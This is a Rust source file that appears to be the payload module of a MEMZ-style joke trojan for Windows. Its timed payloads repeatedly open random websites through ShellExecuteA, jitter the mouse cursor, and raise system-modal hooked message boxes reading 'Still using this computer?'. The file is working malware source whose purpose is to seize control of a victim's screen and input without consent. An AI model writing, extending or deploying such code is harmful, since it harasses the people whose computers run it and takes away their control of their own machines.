use std::thread;

use super::{define::PAYLOAD, system::msg_box_hook};
use crate::{
    data::sites::{N_SITES, SITES},
    wrap_windows_api::{
        wrap_get_current_thread_id, wrap_messagebox_a, wrap_set_windows_hook_ex_a,
        wrap_shell_execute_a, wrap_unhook_windows_hook_ex, WinError,
    },
};
use windows::{
    core::PCSTR,
    Win32::{
        Foundation::{HMODULE, HWND, POINT},
        UI::WindowsAndMessaging::{
            GetCursorPos, SetCursorPos, MB_ICONWARNING, MB_OK, MB_SYSTEMMODAL, SW_SHOWDEFAULT,
            WH_CBT,
        },
    },
};

static TIMES: f32 = 0.0;
static RUNTIME: i32 = 0;

pub const PAYLOADS: &[PAYLOAD] = &[
    PAYLOAD {
        payload_function: payload_execute,
        delay: 30000,
    },
    PAYLOAD {
        payload_function: payload_cursor,
        delay: 30000,
    },
    PAYLOAD {
        payload_function: payload_message_box,
        delay: 20000,
    },
];

fn payload_execute(_: i32, _: i32) -> i32 {
    // PAYLOADHEAD
    wrap_shell_execute_a(
        HWND::default(),
        "open",
        SITES[rand::random::<usize>() % N_SITES],
        PCSTR::null(),
        PCSTR::null(),
        SW_SHOWDEFAULT,
    )
    .expect("Failed ShellExecuteA()");

    (1500.0 / (TIMES / 15.0 + 1.0) + 100.0 + (rand::random::<f32>() % 200.0)) as i32
}

fn payload_cursor(_: i32, _: i32) -> i32 {
    // PAYLOADHEAD
    let mut cursor: POINT = Default::default();
    unsafe {
        GetCursorPos(&mut cursor);
        SetCursorPos(
            cursor.x
                + (rand::random::<i32>() % 3 - 1) * (rand::random::<i32>() % (RUNTIME / 2200 + 2)),
            cursor.y
                + (rand::random::<i32>() % 3 - 1) * (rand::random::<i32>() % (RUNTIME / 2200 + 2)),
        );
    }
    2
}

fn payload_message_box(_: i32, _: i32) -> i32 {
    // PAYLOADHEAD
    let message_box_thread = thread::spawn(move || -> Result<(), WinError> {
        let hook = wrap_set_windows_hook_ex_a(
            WH_CBT,
            Some(msg_box_hook),
            HMODULE::default(),
            wrap_get_current_thread_id(),
        )?;
        wrap_messagebox_a(
            HWND::default(),
            "Still using this computer?",
            "lol",
            MB_SYSTEMMODAL | MB_OK | MB_ICONWARNING,
        )?;
        wrap_unhook_windows_hook_ex(hook)?;

        Ok(())
    });
    message_box_thread.join().unwrap().unwrap();

    (2000.0 / (TIMES / 8.0 + 1.0) + 20.0 + (rand::random::<f32>() % 30.0)) as i32
}
